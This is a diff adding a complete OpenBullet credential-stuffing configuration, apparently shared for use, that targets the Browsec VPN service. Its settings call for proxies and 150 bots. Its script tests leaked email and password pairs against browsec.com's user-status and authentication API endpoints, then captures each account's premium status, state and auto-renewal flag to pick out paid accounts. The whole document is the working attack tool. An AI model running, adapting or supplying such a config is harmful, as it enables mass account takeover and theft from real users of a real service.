@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "Browsec VPN",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-04T15:52:10.6040995+04:30",
+  "AdditionalInfo": "",
+  "Author": "\"The_FiendQQ\"",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#EncodeUSER FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#Get REQUEST GET "https://browsec.com/api/v1/users/status?email=<US>" 
+  
+  HEADER "Host: browsec.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.2" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"active\"}" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"not_created\"}" 
+
+#EncodePASS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Length FUNCTION Length "email=<US>&password=<PS>" -> VAR "Length" 
+
+#Login REQUEST POST "https://browsec.com/api/v1/authentication" 
+  CONTENT "email=<US>&password=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <Length>" 
+  HEADER "Host: browsec.com" 
+  HEADER "Connection: close" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"ok\":false" 
+  KEYCHAIN Success OR 
+    KEY "{\"id\":\"" 
+
+#Premium KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "premium\":false" 
+
+#Premium PARSE "<SOURCE>" JSON "premium" CreateEmpty=FALSE -> CAP "Premium" 
+
+#State PARSE "<SOURCE>" JSON "state" CreateEmpty=FALSE -> CAP "State" 
+
+#Auto_Renewal PARSE "<SOURCE>" JSON "auto_renewal" CreateEmpty=FALSE -> CAP "Auto Renewal" 
+
